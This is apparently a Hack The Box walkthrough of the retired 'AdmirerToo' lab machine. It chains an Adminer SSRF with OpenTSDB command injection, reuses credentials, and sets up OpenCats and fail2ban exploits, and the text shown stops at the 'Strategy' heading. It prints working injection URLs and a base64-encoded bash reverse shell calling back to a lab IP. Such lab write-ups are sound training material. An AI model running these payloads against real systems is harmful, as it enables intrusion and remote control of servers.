---
title: HTB: AdmirerToo
url: https://0xdf.gitlab.io/2022/05/28/htb-admirertoo.html
date: 2022-05-28T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-admirertoo, hackthebox, ctf, nmap, feroxbuster, vhosts, wfuzz, adminer, cve-2021-21311, ssrf, adminer-oneclick-login, opentsdb, python, flask, cve-2020-35476, credentials, opencats, fail2ban, cve-2021-25294, upload, cve-2021-32749, whois, hydra, wireshark, ncat, htb-forge
---

![AdmirerToo](https://0xdfimages.gitlab.io/img/admirertoo-cover.png)

AdmirerToo is all about chaining exploits together. I’ll use a SSRF vulnerability in Adminer to discover a local instance of OpenTSDB, and use the SSRF to exploit a command injection to get a shell. Then I’ll exploit a command injection in Fail2Ban that requires I can control the result of a whois query about my IP. I’ll abuse a file write vulnerability in OpenCats to upload a malicious whois.conf, and then exploit fail2ban getting a shell. In Beyond Root, I’ll look at the final exploit and why nc didn’t work for me at first, but ncat did.

## Box Info

| Name | [AdmirerToo](https://hackthebox.com/machines/admirertoo)  [AdmirerToo](https://hackthebox.com/machines/admirertoo) [Play on HackTheBox](https://hackthebox.com/machines/admirertoo) |
| --- | --- |
| Release Date | [15 Jan 2022](https://twitter.com/hackthebox_eu/status/1481657572113281038) |
| Retire Date | 28 May 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for AdmirerToo |
| Radar Graph | Radar chart for AdmirerToo |
| First Blood User | 01:31:27[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 03:53:17[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.137
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-15 11:23 EST
Nmap scan report for 10.10.11.137
Host is up (0.098s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.137
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-15 11:26 EST
Nmap scan report for 10.10.11.137
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Admirer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds

```

There’s three additional ports returning filtered, which likely indicates that the firewall is blocking them.

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 10 buster.

### Website - TCP 80

#### Site

The site is an image gallery:

![image-20211215113230967](https://0xdfimages.gitlab.io/img/image-20211215113230967.png)

The X at the top right doesn’t do anything. The chat at the bottom right pops this form:

![image-20211215113304045](https://0xdfimages.gitlab.io/img/image-20211215113304045.png)

Sending a message does send a POST request with the fields, but the returned page is the same as with a GET, so it’s unclear if the message actually goes anywhere.

#### Tech Stack

The site is hosted with Apache based on the response headers:

```

HTTP/1.1 200 OK
Date: Wed, 15 Dec 2021 16:33:21 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 14059
Connection: close
Content-Type: text/html; charset=UTF-8
...[snip]...

```

Nothing too interesting there. I can guess extensions on the Index page, and find the main page is `index.php`. Interestingly, when I tried `index.html`, the 404 page leaked some information:

![image-20211215113541779](https://0xdfimages.gitlab.io/img/image-20211215113541779.png)

The link on the IP is a mailto link to `webmaster@admirer-gallery.htb`. On adding the domain to my `/etc/hosts` file and visiting the site, it is still the same.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.137 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.137
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       29w      361c http://10.10.11.137/css
301        9l       29w      360c http://10.10.11.137/js
301        9l       29w      367c http://10.10.11.137/css/fonts
301        9l       29w      361c http://10.10.11.137/img
200      268l      656w        0c http://10.10.11.137/index.php
301        9l       29w      363c http://10.10.11.137/fonts
301        9l       29w      364c http://10.10.11.137/manual
301        9l       29w      371c http://10.10.11.137/manual/images
301        9l       29w      367c http://10.10.11.137/manual/en
301        9l       29w      367c http://10.10.11.137/manual/de
301        9l       29w      367c http://10.10.11.137/manual/fr
301        9l       29w      370c http://10.10.11.137/manual/style
301        9l       29w      367c http://10.10.11.137/manual/es
301        9l       29w      367c http://10.10.11.137/manual/ja
301        9l       29w      367c http://10.10.11.137/manual/tr
301        9l       29w      367c http://10.10.11.137/manual/ko
301        9l       29w      367c http://10.10.11.137/manual/da
301        9l       29w      371c http://10.10.11.137/manual/es/faq
301        9l       29w      371c http://10.10.11.137/manual/es/ssl
301        9l       29w      371c http://10.10.11.137/manual/es/mod
301        9l       29w      378c http://10.10.11.137/manual/style/scripts
301        9l       29w      372c http://10.10.11.137/manual/da/misc
301        9l       29w      371c http://10.10.11.137/manual/de/faq
301        9l       29w      372c http://10.10.11.137/manual/ja/misc
301        9l       29w      372c http://10.10.11.137/manual/ko/misc
301        9l       29w      371c http://10.10.11.137/manual/en/faq
301        9l       29w      371c http://10.10.11.137/manual/de/mod
301        9l       29w      371c http://10.10.11.137/manual/fr/faq
301        9l       29w      376c http://10.10.11.137/manual/es/programs
301        9l       29w      371c http://10.10.11.137/manual/de/ssl
301        9l       29w      371c http://10.10.11.137/manual/ja/faq
301        9l       29w      371c http://10.10.11.137/manual/tr/faq
301        9l       29w      371c http://10.10.11.137/manual/ko/faq
301        9l       29w      371c http://10.10.11.137/manual/en/ssl
301        9l       29w      371c http://10.10.11.137/manual/ja/ssl
301        9l       29w      371c http://10.10.11.137/manual/fr/ssl
[####################] - 2m   2159928/2159928 0s      found:36      errors:1044110
[####################] - 1m     59998/59998   833/s   http://10.10.11.137
[####################] - 1m     59998/59998   647/s   http://10.10.11.137/css
[####################] - 1m     59998/59998   725/s   http://10.10.11.137/js
[####################] - 1m     59998/59998   744/s   http://10.10.11.137/css/fonts
[####################] - 1m     59998/59998   670/s   http://10.10.11.137/img
[####################] - 1m     59998/59998   768/s   http://10.10.11.137/fonts
[####################] - 1m     59998/59998   739/s   http://10.10.11.137/manual
[####################] - 1m     59998/59998   783/s   http://10.10.11.137/manual/images
[####################] - 1m     59998/59998   785/s   http://10.10.11.137/manual/en
...[snip]...

```

Nothing interesting there.

### Subdomain Brute Force

Given the use of the domain `admirer-gallery.htb`, I’ll look for other subdomains that may use virtual host routing to give a different site. I’ll run `wuzz` to show me anything that doesn’t match the default returned size of 14058 characters (`--hh 14058`, which I found by running it once without the filter and seeing that length):

```

oxdf@hacky$ wfuzz -H "Host: FUZZ.admirer-gallery.htb" -u http://10.10.11.137 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 14058
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.137/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
===================================================================

000000143:   200        62 L     169 W    2569 Ch     "db"
000037212:   400        12 L     54 W     483 Ch      "*"

Total time: 1024.343
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 97.62351

```

db is an interesting domain.

### db.admirer-gallery.htb

#### Site

Visiting this page is an instance of Adminer:

![image-20211215114352444](https://0xdfimages.gitlab.io/img/image-20211215114352444.png)

It appears that it’s configured so that I’m already logged in. This is unusual, and I’ll look at why later.

Clicking “Enter” leads to the database:

[![](https://0xdfimages.gitlab.io/img/image-20211215114703012.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211215114703012.png)

There’s only one table, and the data isn’t interesting:

![image-20211215114750027](https://0xdfimages.gitlab.io/img/image-20211215114750027.png)

I’ll try to edit the SQL to read files from the host system, but the user lacks permissions:

![image-20211215115035828](https://0xdfimages.gitlab.io/img/image-20211215115035828.png)

Running `SHOW GRANTS` does leak a hash, but it isn’t easily cracked:

![image-20211215115938801](https://0xdfimages.gitlab.io/img/image-20211215115938801.png)

This shows that the `admirer` user has only SELECT privs, and the `admirer_ro` account has `USAGE`, which the [docs](https://dev.mysql.com/doc/refman/8.0/en/grant.html) say is equivalent to no privs.

#### Tech Stack / Exploits

The site is hosted by the same Apached. Adminer is a PHP-based application, and visiting `/index.php` verifies that.

The site does identify itself as Adminer 4.7.8. There is vulnerability, [CVE-2021-21311](https://nvd.nist.gov/vuln/detail/CVE-2021-21311), which is a server-side request forgery in Adminer version 4.0.0. to 4.7.9.

#### Directory Brute Force

Similar directory brute force to above. There was a ton of uninteresting stuff in the `manual` directory, so I’ll use `--dont-scan manual/` to remove that (for readability):

```

oxdf@hacky$ feroxbuster -u http://db.admirer-gallery.htb -x php --dont-scan manual/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://db.admirer-gallery.htb
 🚫  Don't Scan Regex      │ manual/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       29w      385c http://db.admirer-gallery.htb/plugins => http://db.admirer-gallery.htb/plugins/
200      GET       62l      169w        0c http://db.admirer-gallery.htb/
403      GET        9l       29w      338c http://db.admirer-gallery.htb/.php
200      GET       62l      169w        0c http://db.admirer-gallery.htb/index.php
301      GET        9l       29w      384c http://db.admirer-gallery.htb/manual => http://db.admirer-gallery.htb/manual/
[####################] - 1m    240000/240000  0s      found:5       errors:136    
[####################] - 1m     60000/60000   532/s   http://db.admirer-gallery.htb 
[####################] - 0s     60000/60000   0/s     http://db.admirer-gallery.htb/plugins => Directory listing (add -e to scan)
[####################] - 1m     60000/60000   533/s   http://db.admirer-gallery.htb/ 
[####################] - 0s     60000/60000   84860/s http://db.admirer-gallery.htb/manual

```

There is a `plugins` directory, and `feroxbuster` shows that dir listing is enabled, which I can confirm:

![image-20211215121047371](https://0xdfimages.gitlab.io/img/image-20211215121047371.png)

`oneclick-login.php` is an Adminer plugin, [OneClick Login](https://github.com/giofreitas/one-click-login). It’s a wrapper around the base `adminer.php` page that sets up login without need for auth. That explains why no password was needed to interact with the DB.

## Shell as opentsdb

### SSRF in Adminer

#### CVE-2021-21311 POC

[This writeup](https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf) goes into good detail for how CVE-2021-21311works, using the module that handles logins for Elastic search to have the server make requests on my behalf.

An SSRF is when an attacker can get the server to make requests on their behalf. In this case, the attacker only controls the server fields in the request, which will error out on anything but a hostname or IP. The trick is to give it the IP of a server I control (say, my VM), and then have my webserver respond with a 301 redirect. Then the server will visit the full URL in that redirect, and the results of the query are returned on the page.

#### No Elastic?

The first challenge here is that I don’t get a login page to select Elasticsearch and give a server IP, because of the OneClick Login plugin. Still if I look at the POST request that comes from clicking “Enter”, it includes the same parameters that are normally in the form:

```

POST / HTTP/1.1
Host: db.admirer-gallery.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://db.admirer-gallery.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Origin: http://db.admirer-gallery.htb
Connection: close
Cookie: adminer_version=4.8.1; adminer_permanent=; adminer_sid=gc4k4jh4lt65un371410p0m17d; adminer_key=806174fe7b7ce8f715004727b936a826
Upgrade-Insecure-Requests: 1

auth%5Bdriver%5D=server&auth%5Bserver%5D=localhost&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1

```

At first I tried sending this to Repeater and modifying it, but it doesn’t work. I believe the `adminer_sid` cookie is changing on each request, and that makes it non-repeatable.

But intercepting the POST and editing it does work. I’ll click “Enter”, and intercept that request in Burp. I’ll edit the POST data, setting the`auth[driver]` to “elastic” and `auth[server]` to my IP:

[![image-20211215123027195](https://0xdfimages.gitlab.io/img/image-20211215123027195.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211215123027195.png)

The response is a redirect to `?elastic`:

```

HTTP/1.1 302 Found
Date: Wed, 15 Dec 2021 17:28:22 GMT
Server: Apache/2.4.38 (Debian)
Set-Cookie: adminer_sid=tmii352kufpdsc3l3vj8k5krue; path=/; HttpOnly
Set-Cookie: adminer_permanent=ZWxhc3RpYw%3D%3D-MTAuMTAuMTQuNg%3D%3D-YWRtaXJlcl9ybw%3D%3D-YWRtaXJlcg%3D%3D%3Avzc6orsY6HwZ%2BvBgn8gw%2FLjefr8mdtQi; expires=Fri, 14 Jan 2022 17:28:22 GMT; path=/; HttpOnly; SameSite=lax
Location: ?elastic=10.10.14.6&username=admirer_ro&db=admirer
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

When that request completes, there’s a request at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.137 56058
GET / HTTP/1.0
Authorization: Basic YWRtaXJlcl9ybzo=
Host: 10.10.14.6
Connection: close
Content-Length: 2
Content-Type: application/json

[]

```

#### Issue Redirect

There’s a POC in the exploit description using legacy Python to do the redirect. I did something similar in [Forge](/2022/01/22/htb-forge.html#redirection-to-admin) using Flask, so I’ll do that same thing here.

```

#!/usr/bin/env python

import sys
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/")
def admin():
    return redirect(sys.argv[1])

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)

```

This script will redirect to whatever I give at the command line as the next url. To test it, I’ll just have it redirect to my server `/test`:

```

oxdf@hacky$ python redirect.py '/test'
 * Serving Flask app 'redirect' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.1.1.159:80/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 864-547-918

```

Now I log in again (intercepting and modifying the server and type), and on sending the redirect, a request reaches the server, and then it requests `/test` (twice actually):

```
10.10.11.137 - - [15/Dec/2021 12:34:56] "GET / HTTP/1.0" 302 -
10.10.11.137 - - [15/Dec/2021 12:34:56] "GET /test HTTP/1.0" 404 -
10.10.11.137 - - [15/Dec/2021 12:34:57] "GET / HTTP/1.0" 302 -
10.10.11.137 - - [15/Dec/2021 12:34:57] "GET /test HTTP/1.0" 404 -

```

Is a successful SSRF exploit.

#### Enumeration

Now that I can have AdmirerToo send requests, I’ll check out the ports that were blocked by the firewall in the original `nmap`. The services on 16010 and 16030 didn’t return anything (both just hung). But with the Flask server run as `python redirect.py 'http://localhost:4242'`, the page returns HTML (whitespace added for readability):

```

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv=content-type content="text/html;charset=utf-8">
        <title>OpenTSDB</title>
        <style><!-- 
...[snip]...
        </style>
        <script type=text/javascript language=javascript src=s/queryui.nocache.js></script>
    </head>
    <body text=#000000 bgcolor=#ffffff>
        <table border=0 cellpadding=2 cellspacing=0 width=100%>
            <tr>
                <td rowspan=3 width=1% nowrap>
                    <img src=s/opentsdb_header.jpg>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td>
                    <font color=#507e9b><b></b>
                </td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
        </table>
        <div id=queryuimain></div>
        <noscript>You must have JavaScript enabled.</noscript>
        <iframe src=javascript:'' id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0></iframe>
        <table width=100% cellpadding=0 cellspacing=0>
            <tr>
                <td class=subg>
                    <img alt="" width=1 height=6>
                </td>
            </tr>
        </table>
    </body>
</html>

```

The page isn’t showing much because “You must have JavaScript enabled.”, but the `<title>` tag is interesting: OpenTSDB.

### RCE in OpenTSDB

#### POC

OpenTSDB is a time series database that runs on Hadoop and HBase. It’s a Java application, and the source is hosted [on GitHub](https://github.com/OpenTSDB/opentsdb).

Some Googling returns [CVE-2020-35476](https://github.com/OpenTSDB/opentsdb/issues/2051), which is remote code execution in OpenTSDB. It’s a bit of an older vulnerability, but it’s restricted to localhost access, so maybe the admins think it’s safe.

#### Initial Fails

I’ll use the payload from the GitHub issue linked above, replacing their domain with `localhost` so that AdmirerToo contacts its own instance, and changing the payload from `touch` a file to `ping` of my host:

```

http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.6')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json

```

On setting that URL as the director and doing the login process again, the page returns a giant Java error:

[![image-20211215130048364](https://0xdfimages.gitlab.io/img/image-20211215130048364.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211215130048364.png)

At the very bottom of that message is the reason for why this crashed:

[![image-20211215130158373](https://0xdfimages.gitlab.io/img/image-20211215130158373.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211215130158373.png)

The URL above uses `m=sum:sys.cpu.nice`, but that doesn’t exist on this host.

#### Find Metric

In Googling for this error, I eventually found [this StackOverflow post](https://stackoverflow.com/questions/50217959/list-of-opentsdb-metrics) which says that `/api/suggests` will return available metrics with the right parameters. I’ll set the redirect to `http://localhost:4242/api/suggest/?type=metrics&q=&max=20`, and login again:

![image-20211215131206846](https://0xdfimages.gitlab.io/img/image-20211215131206846.png)

I don’t really know what that means, but I’m willing to try it. I’ll update the redirect url to what I had above, but this time with the new metric:

```

http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('ping+-c+1+10.10.14.6')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json

```

Now on logging in, the returned data doesn’t look like an error:

![image-20211215131500572](https://0xdfimages.gitlab.io/img/image-20211215131500572.png)

More importantly, I get `pings`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:13:58.231154 IP 10.10.11.137 > 10.10.14.6: ICMP echo request, id 2851, seq 1, length 64
13:13:58.231180 IP 10.10.14.6 > 10.10.11.137: ICMP echo reply, id 2851, seq 1, length 64

```

#### Shell

I’ll create a payload to avoid having to put quote marks into the URL:

```

oxdf@hacky$ echo "bash  -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" | base64 
YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK

```

I’ll restart the Flask server with the new redirect URL:

```

oxdf@hacky$ python redirect.py "http://localhost:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
 * Serving Flask app 'redirect' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.1.1.159:80/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 864-547-918

```

When I log in, I get a shell at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.137 34436
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
opentsdb@admirertoo:/$ $ id
uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)

```

I’ll upgrade the shell using `script`:

```

opentsdb@admirertoo:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
opentsdb@admirertoo:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
opentsdb@admirertoo:/$

```

## Shell as jennifer

### Enumeration

#### Home Dirs

There’s only one user home directory on the box, jennifer:

```

opentsdb@admirertoo:/home$ ls
jennifer

```

This directory contains `user.txt`, but I can’t read it.

#### Web

`/etc/apache2/sites-enabled/000-default.conf` shows two virtual hosts, `admirer-gallery.htb` hosted out of `/var/www/html` and `db.admirer-gallery.htb` hosted out of `/var/www/adminer`. There’s not much interesting in `var/www/html`.

In `adminer`, there’s the `plugins` directory, just as a observed in initial enumeration. in `data`, there’s `servers.php`, which holds the creds to the database:

```

<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];

```

### su / SSH

The commented out password, ‘bQ3u7^AxzcB7qAsxE3’, works for jennifer with `su`:

```

opentsdb@admirertoo:/var/www/adminer/plugins/data$ su - jennifer
Password: 
jennifer@admirertoo:~$

```

It also works for SSH:

```

oxdf@hacky$ sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137
...[snip]...
jennifer@admirertoo:~$ 

```

From there, I can read `user.txt`:

```

jennifer@admirertoo:~$ cat user.txt
a23b09cb************************

```

## Shell as root

### Enumeration

#### Listening Ports

There’s not much new on the box that I can access as jennifer that I couldn’t access before. Still at this point I’ll look at the listening ports:

```

jennifer@admirertoo:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::16030                :::*                    LISTEN      -
tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      -
tcp6       0      0 :::16010                :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

There’s a few ports here listening only on localhost that I want to check out.

I’ll reconnect `ssh` creating a a bunch of tunnels:

```

oxdf@hacky$ sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137 -L 8081:localhost:8080 -L 16030:localhost:16030 -L 2181:localhost:2181 -L 16010:localhost:16010 -L 16020:localhost:16020
...[snip]...
jennifer@admirertoo:~$ 

```

2181, 16010, 16020, and 16030 all just time out or reset.

#### OpenCats

Going to `http://localhost:8081` in Firefox loads a login form for an instance of OpenCats:

![image-20211215135431335](https://0xdfimages.gitlab.io/img/image-20211215135431335.png)

[OpenCats](https://www.opencats.org/) is a free and open source applicant tracking system. The form also leaks the version, 0.9.5.2.

The creds for jennifer work to log in:

![image-20211215145238195](https://0xdfimages.gitlab.io/img/image-20211215145238195.png)

There’s not much of interest in the application.

The config for this application is in `/etc/apache2-opencats`. Pulling the uncommented lines from`apache2.conf` has the following:

```

jennifer@admirertoo:/etc/apache2-opencats$ grep -v "^#" apache2.conf | grep .
DefaultRuntimeDir ${APACHE_RUN_DIR}
PidFile ${APACHE_PID_FILE}
Timeout 300
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5
User devel
Group devel
HostnameLookups Off
ErrorLog ${APACHE_LOG_DIR}/error.log
LogLevel warn
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf
Include ports.conf
<Directory />
        Options FollowSymLinks
        AllowOverride None
        Require all denied
</Directory>
<Directory /usr/share>
        AllowOverride None
        Require all granted
</Directory>
<Directory /opt/opencats>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
AccessFileName .htaccess
<FilesMatch "^\.ht">
        Require all denied
</FilesMatch>
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent
IncludeOptional conf-enabled/*.conf
IncludeOptional sites-enabled/*.conf

```

Most interesting to solving this box, it is running as user and group devel.

#### Fail2ban

[Fail2ban](https://www.fail2ban.org/wiki/index.php/Main_Page) is an anti-brute force framework that is common on Linux. It’s installed here:

```

jennifer@admirertoo:/etc/fail2ban$ fail2ban-client -V
Fail2Ban v0.10.2

Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban Contributors
Copyright of modifications held by their respective authors.
Licensed under the GNU General Public License v2 (GPL).

```

It’s not uncommon to see `fail2ban` on HTB machines where brute forcing could cause stability issues, but I hadn’t run into anything like that on this box. `fail2ban` is running as a service on AdmirerToo:

```

jennifer@admirertoo:/etc/fail2ban$ systemctl list-units | grep fail
fail2ban.service                                                                                 loaded active running   Fail2Ban Service

```

I’ll also note that the config at `/etc/fail2ban/jail.local` includes a ban with a mail action:

```

[DEFAULT]
ignoreip = 127.0.0.1
bantime = 60s
destemail = root@admirertoo.htb
sender = fail2ban@admirertoo.htb
sendername = Fail2ban
mta = mail
action = %(action_mwl)s

```

So I should be able to trigger a ban from `fail2ban` by brute-forcing SSH.

### Exploits

#### Cats File Upload

CVE-2021-25294 is a PHP object injection vulnerability that leads to file write. [This post](https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html) does a nice job describing it.

Basically I can use `phpggc` to create a PHP serialized object with the file I want to write, and the submit it to OpenCats it will write it.

The challenge here is what I can I write that will help me. I noted above that OpenCats is running as the devel user/group. That leaves only two folders and a file that are owned by the group:

```

jennifer@admirertoo:~$ find / -user devel -ls 2>/dev/null
jennifer@admirertoo:~$ find / -group devel -ls 2>/dev/null
    18630      4 -rw-r--r--   1 root     devel         104 Jul 21 11:51 /opt/opencats/INSTALL_BLOCK
   130578      4 drwxrwxr-x   2 root     devel        4096 Jul  7 06:36 /usr/local/src
   130579      4 drwxrwxr-x   2 root     devel        4096 Jul  7 06:36 /usr/local/etc

```

The web directories are only writeable by root, so writing a webshell won’t work (and won’t really help me either). It’s not easy to see it now, but `/usr/local/etc` will turn out to be useful in a bit.

#### fail2ban RCE

[This GitHub issue](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) outlines what would become CVE-2021-32749. The issues is in how `fail2ban` pipes output to the `mail` command. In this case, the default ban action is to send an email based on this:

> ```

> actionban = printf %%b "Hi,\n
>             The IP <ip> has just been banned by Fail2Ban after
>             <failures> attempts against <name>.\n\n
>             Here is more information about <ip> :\n
>             `%(_whois_command)s`\n
>             Regards,\n
>             Fail2Ban"|mail -s "[Fail2Ban] <name>: banned <ip> from <fq-hostname>" <dest>
>
> ```

If an attacker can control the results of the `whois` command, then they can insert `~! [command]` into the text going to `mail`, which will execute `[command]`.

### RCE

#### Strategy

